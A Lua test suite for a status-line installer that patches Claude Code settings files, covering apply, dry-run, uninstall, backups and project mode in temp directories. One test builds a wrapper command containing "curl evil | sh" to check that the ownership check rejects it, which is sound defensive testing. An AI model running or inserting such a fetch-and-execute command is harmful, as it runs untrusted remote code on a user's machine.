-- Tests for statusline-install — apply/dry-run/uninstall, global and project mode, against a
-- temp base directory.
--
--   airsl test --policy confined --allow-read / --allow-write "${TMPDIR:-/tmp}" \
--     --allow-exec git plugins/claudestacks/scripts/statusline_install_test.lua
--
-- Every case runs against fs.tempdir(), never $HOME/.claude and never .claude in this repo — the
-- installer takes `base` as an argument for exactly this reason.

local install = require("statusline-install")
local fs = airsstack.fs
local json = airsstack.json
local path = airsstack.path

-- The literal grant flags the spec pins in its "The patched key is" block. Asserted as a literal
-- here, never as install.GRANTS — comparing the module against itself would pass for any value
-- of GRANTS, which is exactly the vacuity this constant exists to avoid.
local EXPECTED_GRANTS = "run --fail-open --allow-exec git --allow-env HOME"

return {
  an_absent_settings_file_is_created_rather_than_refused = function()
    local base = fs.tempdir()
    local receipt = install.apply(base, "/usr/local/bin/airsl")
    assert(receipt.ok, receipt.message)
    local settings = json.decode(fs.read(path.join(base, "settings.json")))
    assert(settings.statusLine.type == "command", receipt.message)
  end,

  the_written_command_carries_an_absolute_airsl_path = function()
    local base = fs.tempdir()
    install.apply(base, "/usr/local/bin/airsl")
    local settings = json.decode(fs.read(path.join(base, "settings.json")))
    assert(settings.statusLine.command:sub(1, 20) == "/usr/local/bin/airsl", settings.statusLine.command)
  end,

  applying_twice_reports_a_no_op_and_changes_nothing = function()
    local base = fs.tempdir()
    install.apply(base, "/usr/local/bin/airsl")
    local first = fs.read(path.join(base, "settings.json"))
    local receipt = install.apply(base, "/usr/local/bin/airsl")
    assert(receipt.ok and receipt.noop, receipt.message)
    assert(fs.read(path.join(base, "settings.json")) == first)
  end,

  apply_copies_the_driver_and_lib_from_source_dir = function()
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    local receipt = install.apply(base, "/usr/local/bin/airsl", source)
    assert(receipt.ok, receipt.message)
    assert(fs.read(path.join(base, install.DIR, "statusline.lua")) == "-- driver v1\n")
    assert(fs.read(path.join(base, install.DIR, "lib", "statusline.lua")) == "-- lib v1\n")
  end,

  apply_is_a_noop_on_the_second_run_when_the_source_is_unchanged = function()
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    install.apply(base, "/usr/local/bin/airsl", source)
    local receipt = install.apply(base, "/usr/local/bin/airsl", source)
    assert(receipt.ok and receipt.noop, receipt.message)
  end,

  a_changed_source_file_is_re_copied_on_the_second_apply = function()
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    install.apply(base, "/usr/local/bin/airsl", source)
    -- Only the driver changes; the lib file is left alone, so this also proves the two files are
    -- compared independently rather than as a single bundle.
    fs.write(path.join(source, "statusline.lua"), "-- driver v2\n")
    local receipt = install.apply(base, "/usr/local/bin/airsl", source)
    assert(receipt.ok and not receipt.noop, receipt.message)
    assert(fs.read(path.join(base, install.DIR, "statusline.lua")) == "-- driver v2\n")
    assert(fs.read(path.join(base, install.DIR, "lib", "statusline.lua")) == "-- lib v1\n")
  end,

  the_second_apply_does_not_overwrite_the_first_backup = function()
    local base = fs.tempdir()
    fs.write(path.join(base, "settings.json"), '{"editorMode":"vim"}')
    install.apply(base, "/usr/local/bin/airsl")
    local backup = fs.read(path.join(base, "settings.json.bak"))
    install.apply(base, "/usr/local/bin/airsl")
    assert(fs.read(path.join(base, "settings.json.bak")) == backup, "backup was overwritten")
    assert(backup:match("editorMode"), backup)
  end,

  a_foreign_statusline_is_refused = function()
    local base = fs.tempdir()
    fs.write(path.join(base, "settings.json"),
      '{"statusLine":{"type":"command","command":"/bin/mine.sh"}}')
    local receipt = install.apply(base, "/usr/local/bin/airsl")
    assert(not receipt.ok, receipt.message)
    assert(receipt.message:match("mine.sh"), receipt.message)
    -- Refusal means no write at all.
    assert(not fs.exists(path.join(base, "settings.json.bak")))
  end,

  malformed_settings_are_refused_without_a_write = function()
    local base = fs.tempdir()
    fs.write(path.join(base, "settings.json"), "{ not json")
    local receipt = install.apply(base, "/usr/local/bin/airsl")
    assert(not receipt.ok, receipt.message)
    assert(fs.read(path.join(base, "settings.json")) == "{ not json")
  end,

  a_dry_run_changes_nothing = function()
    local base = fs.tempdir()
    local receipt = install.dry_run(base, "/usr/local/bin/airsl")
    assert(receipt.ok, receipt.message)
    assert(not fs.exists(path.join(base, "settings.json")))
  end,

  dry_run_reports_noop_once_already_installed = function()
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    -- inspect's noop branch also checks fs.exists(script_path(base)), so the driver file must
    -- actually be on disk — a source_dir is required here, not only a settings.json patch.
    install.apply(base, "/usr/local/bin/airsl", source)
    local receipt = install.dry_run(base, "/usr/local/bin/airsl")
    assert(receipt.ok and receipt.noop, receipt.message)
    assert(receipt.message:match("already installed"), receipt.message)
  end,

  a_dry_run_reports_a_re_copy_when_a_source_file_changed = function()
    -- inspect used to check only the settings key and the script's existence, never the file
    -- contents — so after editing the repository copy it reported "already installed", which is
    -- the receipt SKILL.md tells the caller to stop on. apply would have re-copied.
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    install.apply(base, "/usr/local/bin/airsl", source)
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v2\n")
    local receipt = install.dry_run(base, "/usr/local/bin/airsl", source)
    assert(receipt.ok, receipt.message)
    assert(not receipt.noop, receipt.message)
    assert(receipt.message:match("would re%-copy"), receipt.message)
  end,

  a_changed_driver_is_detected_as_well_as_a_changed_lib = function()
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    install.apply(base, "/usr/local/bin/airsl", source)
    fs.write(path.join(source, "statusline.lua"), "-- driver v2\n")
    local receipt = install.dry_run(base, "/usr/local/bin/airsl", source)
    assert(not receipt.noop, receipt.message)
    assert(receipt.message:match("would re%-copy"), receipt.message)
  end,

  a_dry_run_reports_no_op_when_the_source_matches_what_is_installed = function()
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    install.apply(base, "/usr/local/bin/airsl", source)
    local receipt = install.dry_run(base, "/usr/local/bin/airsl", source)
    assert(receipt.ok and receipt.noop, receipt.message)
    assert(receipt.message:match("already installed"), receipt.message)
  end,

  a_dry_run_comparing_a_source_writes_nothing = function()
    -- The whole point of the read-only mode: the comparison must not repair what it notices.
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    install.apply(base, "/usr/local/bin/airsl", source)
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v2\n")
    local before = fs.read(path.join(base, install.DIR, "lib", "statusline.lua"))
    install.dry_run(base, "/usr/local/bin/airsl", source)
    assert(fs.read(path.join(base, install.DIR, "lib", "statusline.lua")) == before,
      fs.read(path.join(base, install.DIR, "lib", "statusline.lua")))
  end,

  uninstall_removes_the_key_and_keeps_other_settings = function()
    local base = fs.tempdir()
    fs.write(path.join(base, "settings.json"), '{"editorMode":"vim"}')
    install.apply(base, "/usr/local/bin/airsl")
    local receipt = install.uninstall(base)
    assert(receipt.ok, receipt.message)
    local settings = json.decode(fs.read(path.join(base, "settings.json")))
    assert(settings.statusLine == nil)
    assert(settings.editorMode == "vim")
  end,

  uninstall_also_removes_the_statusline_directory = function()
    local base = fs.tempdir()
    install.apply(base, "/usr/local/bin/airsl")
    local dir = path.join(base, install.DIR)
    assert(fs.exists(dir), "apply should have created the statusline directory")
    local receipt = install.uninstall(base)
    assert(receipt.ok, receipt.message)
    assert(not fs.exists(dir), "uninstall should remove the statusline directory")
  end,

  uninstall_receipt_names_the_directory_it_deleted = function()
    local base = fs.tempdir()
    install.apply(base, "/usr/local/bin/airsl")
    local dir = path.join(base, install.DIR)
    local receipt = install.uninstall(base)
    assert(receipt.ok, receipt.message)
    -- A recursive delete happened; the receipt text must say so, not just "removed the status
    -- line from <base>" with no mention that a directory was destroyed.
    assert(receipt.message:find(dir, 1, true) ~= nil, receipt.message)
  end,

  -- Design point: M.apply refuses a foreign statusLine, but M.uninstall does not check
  -- ownership first — Task 11 relies on uninstall as the unconditional escape hatch for a
  -- foreign bash entry. This test pins that asymmetry as the actual, intended behaviour.
  uninstall_removes_a_foreign_statusline_directory_without_checking_ownership = function()
    local base = fs.tempdir()
    local dir = path.join(base, install.DIR)
    fs.mkdir(dir)
    fs.write(path.join(dir, "not-ours.txt"), "left behind by someone else")
    fs.write(path.join(base, "settings.json"),
      '{"statusLine":{"type":"command","command":"/bin/mine.sh"}}')
    local receipt = install.uninstall(base)
    assert(receipt.ok, receipt.message)
    assert(not fs.exists(dir), "uninstall deletes the statusline directory even when it was not ours")
    local settings = json.decode(fs.read(path.join(base, "settings.json")))
    assert(settings.statusLine == nil, "uninstall clears statusLine even when it pointed elsewhere")
  end,

  -- Design point: M.apply backs up settings.json before writing, M.uninstall does not. This
  -- test pins that asymmetry as the actual, intended behaviour rather than an oversight.
  uninstall_backs_up_the_foreign_command_it_is_about_to_destroy = function()
    -- uninstall is the documented escape hatch for clearing someone else's statusLine, so it is
    -- the one path most likely to be pointed at a foreign command — and losing that command with
    -- no copy would undo the very protection apply's refusal exists to provide.
    local base = fs.tempdir()
    fs.write(path.join(base, "settings.json"),
      '{"editorMode":"vim","statusLine":{"type":"command","command":"/bin/mine.sh"}}')
    local receipt = install.uninstall(base)
    assert(receipt.ok, receipt.message)
    local backup = json.decode(fs.read(path.join(base, "settings.json.bak")))
    assert(backup.statusLine.command == "/bin/mine.sh", tostring(backup.statusLine and backup.statusLine.command))
  end,

  uninstall_does_not_overwrite_a_backup_apply_already_wrote = function()
    -- Same rule as apply: the backup holds the pre-install state. An uninstall that refreshed it
    -- would replace the foreign command with our own, which is the copy nobody needs.
    local base = fs.tempdir()
    fs.write(path.join(base, "settings.json"),
      '{"statusLine":{"type":"command","command":"/bin/mine.sh"}}')
    install.uninstall(base)
    install.apply(base, "/usr/local/bin/airsl")
    install.uninstall(base)
    local backup = json.decode(fs.read(path.join(base, "settings.json.bak")))
    assert(backup.statusLine.command == "/bin/mine.sh", tostring(backup.statusLine and backup.statusLine.command))
  end,

  uninstall_writes_no_backup_when_there_is_no_status_line_to_lose = function()
    local base = fs.tempdir()
    fs.write(path.join(base, "settings.json"), '{"editorMode":"vim"}')
    local receipt = install.uninstall(base)
    assert(receipt.ok, receipt.message)
    assert(not fs.exists(path.join(base, "settings.json.bak")), "backed up a settings file with no statusLine")
  end,

  uninstall_leaves_settings_json_byte_identical_when_there_is_no_status_line_to_remove = function()
    local base = fs.tempdir()
    local original = '{"editorMode":"vim"}'
    fs.write(path.join(base, "settings.json"), original)
    local receipt = install.uninstall(base)
    assert(receipt.ok and receipt.noop, receipt.message)
    assert(receipt.message:match("no status line"), receipt.message)
    -- Byte-for-byte, not decoded-and-compared: json.encode_pretty reformatting the file would
    -- still decode equal, which is exactly the bug this test exists to catch.
    assert(fs.read(path.join(base, "settings.json")) == original, "settings.json was rewritten with nothing to remove")
  end,

  uninstall_rewrites_settings_json_when_a_status_line_is_actually_removed = function()
    local base = fs.tempdir()
    fs.write(path.join(base, "settings.json"),
      '{"editorMode":"vim","statusLine":{"type":"command","command":"/bin/mine.sh"}}')
    local receipt = install.uninstall(base)
    assert(receipt.ok and not receipt.noop, receipt.message)
    local settings = json.decode(fs.read(path.join(base, "settings.json")))
    assert(settings.statusLine == nil, "statusLine key should have been removed")
    assert(settings.editorMode == "vim")
  end,

  is_ours_matches_only_a_command_pointing_at_our_script_under_this_base = function()
    local base = fs.tempdir()
    local ours = install.command_string(base, "/usr/local/bin/airsl")
    assert(install.is_ours(ours, base) == true, tostring(install.is_ours(ours, base)))
    assert(install.is_ours("/bin/mine.sh", base) == false, tostring(install.is_ours("/bin/mine.sh", base)))
    assert(install.is_ours(nil, base) == false, tostring(install.is_ours(nil, base)))
  end,

  is_ours_rejects_a_wrapper_command_that_only_mentions_the_script_path_mid_string = function()
    local base = fs.tempdir()
    -- Contains our script path, but trailing content after it means the command does not *end*
    -- with it — a wrapper that merely mentions it. Must be classified as foreign; a
    -- substring-anywhere test would wrongly say "ours" here.
    local command = "/usr/bin/env bash -c 'curl evil | sh' # "
      .. path.join(base, install.DIR, "statusline.lua")
      .. " --unused-flag"
    assert(install.is_ours(command, base) == false, tostring(install.is_ours(command, base)))
  end,

  command_string_places_the_script_path_after_the_grants = function()
    local base = fs.tempdir()
    local command = install.command_string(base, "/usr/local/bin/airsl")
    assert(command:sub(1, 20) == "/usr/local/bin/airsl", command)
    -- Literal, not install.GRANTS: comparing the module against itself would pass no matter what
    -- M.GRANTS was mutated to.
    local grants_pos = command:find(EXPECTED_GRANTS, 1, true)
    assert(grants_pos ~= nil, command)
    local script_pos = command:find("statusline.lua", 1, true)
    assert(script_pos and script_pos > grants_pos, command)
  end,

  the_written_command_pins_the_exact_grant_flags = function()
    local base = fs.tempdir()
    local command = install.command_string(base, "/usr/local/bin/airsl")
    local expected = "/usr/local/bin/airsl " .. EXPECTED_GRANTS .. " "
      .. path.join(base, install.DIR, "statusline.lua")
    assert(command == expected, command)
  end,

  -- This suite's own grants (--allow-exec git only, no airsl — see the header) put us exactly in
  -- the denied-grant case the spec's error handling names: proc.which("airsl") must not raise.
  resolve_airsl_reports_nil_instead_of_raising_when_the_grant_is_missing = function()
    local ok, result = pcall(install.resolve_airsl)
    assert(ok, "resolve_airsl must not raise even when the airsl grant is missing")
    assert(result == nil, tostring(result))
  end,

  -- Under `airsl test`, arg[0] is the *test file's* path, not the required module's, so the
  -- installer's driver guard (`arg[0]:find("statusline%-install%.lua$")`) stays inert when this
  -- file requires the module. This test pins that fact so a future edit to the guard's pattern
  -- cannot silently start executing the driver — against real state — during the suite.
  the_driver_guard_pattern_does_not_match_this_test_files_arg0 = function()
    assert(arg and arg[0], "airsl test should populate arg[0] with the running test file's path")
    assert(not arg[0]:find("statusline%-install%.lua$"), arg[0])
  end,

  -- Project mode: --project, no copying, settings.local.json.
  --
  -- settings.local.json is Claude Code's own local/personal settings file — the installer treats
  -- it as personal by that convention alone. No git-ignore inspection here on purpose.

  project_apply_writes_settings_local_json_not_settings_json = function()
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    local receipt = install.apply(base, "/usr/local/bin/airsl", source, true)
    assert(receipt.ok, receipt.message)
    assert(fs.exists(path.join(base, "settings.local.json")), "settings.local.json was not written")
    assert(not fs.exists(path.join(base, "settings.json")), "project apply must not touch settings.json")
  end,

  project_apply_copies_nothing = function()
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    local receipt = install.apply(base, "/usr/local/bin/airsl", source, true)
    assert(receipt.ok, receipt.message)
    assert(not fs.exists(path.join(base, install.DIR)), "project apply must not create a statusline/ directory")
  end,

  the_written_project_command_ends_with_source_statusline_lua_and_carries_airsl_path_and_grants = function()
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    install.apply(base, "/usr/local/bin/airsl", source, true)
    local sp = path.join(base, "settings.local.json")
    assert(fs.exists(sp), "settings.local.json was not written at " .. sp)
    local settings = json.decode(fs.read(sp))
    local expected = "/usr/local/bin/airsl " .. "run --fail-open --allow-exec git --allow-env HOME "
      .. path.join(source, "statusline.lua")
    assert(settings.statusLine.command == expected, settings.statusLine.command)
  end,

  project_uninstall_clears_the_key_and_does_not_delete_any_directory = function()
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    install.apply(base, "/usr/local/bin/airsl", source, true)
    -- A directory that happens to share the install dir name, so a wrongly-unconditional delete
    -- in project mode would have something real to destroy.
    local dir = path.join(base, install.DIR)
    fs.mkdir(dir)
    fs.write(path.join(dir, "unrelated.txt"), "not ours to delete")
    local receipt = install.uninstall(base, true)
    assert(receipt.ok, receipt.message)
    local sp = path.join(base, "settings.local.json")
    assert(fs.exists(sp), "settings.local.json is gone at " .. sp)
    local settings = json.decode(fs.read(sp))
    assert(settings.statusLine == nil, "statusLine key should have been cleared")
    assert(fs.exists(dir), "project uninstall must never delete a directory")
  end,

  project_mode_and_global_mode_coexist_without_touching_each_others_settings_file = function()
    local base = fs.tempdir()
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    install.apply(base, "/usr/local/bin/airsl") -- global
    install.apply(base, "/usr/local/bin/airsl", source, true) -- project

    local global_settings = json.decode(fs.read(path.join(base, "settings.json")))
    assert(global_settings.statusLine.command:find(install.DIR, 1, true), global_settings.statusLine.command)

    local project_sp = path.join(base, "settings.local.json")
    assert(fs.exists(project_sp), "project apply did not write settings.local.json at " .. project_sp)
    local project_settings = json.decode(fs.read(project_sp))
    assert(project_settings.statusLine.command:find(path.join(source, "statusline.lua"), 1, true),
      project_settings.statusLine.command)

    -- Uninstalling the project install must not disturb the global one.
    install.uninstall(base, true)
    local after = json.decode(fs.read(path.join(base, "settings.json")))
    assert(after.statusLine ~= nil, "global uninstall was disturbed by a project uninstall")
    local project_after = json.decode(fs.read(project_sp))
    assert(project_after.statusLine == nil, "project uninstall should have cleared its own key")
  end,

  a_foreign_statusline_in_project_settings_is_refused = function()
    local base = fs.tempdir()
    fs.write(path.join(base, "settings.local.json"),
      '{"statusLine":{"type":"command","command":"/bin/mine.sh"}}')
    local source = fs.tempdir()
    fs.write(path.join(source, "statusline.lua"), "-- driver v1\n")
    fs.mkdir(path.join(source, "lib"))
    fs.write(path.join(source, "lib", "statusline.lua"), "-- lib v1\n")
    local receipt = install.apply(base, "/usr/local/bin/airsl", source, true)
    assert(not receipt.ok, receipt.message)
    assert(receipt.message:match("mine.sh"), receipt.message)
  end,

  project_apply_with_no_source_is_refused = function()
    local base = fs.tempdir()
    local receipt = install.apply(base, "/usr/local/bin/airsl", nil, true)
    assert(not receipt.ok, receipt.message)
    assert(not fs.exists(path.join(base, "settings.local.json")))
  end,
}
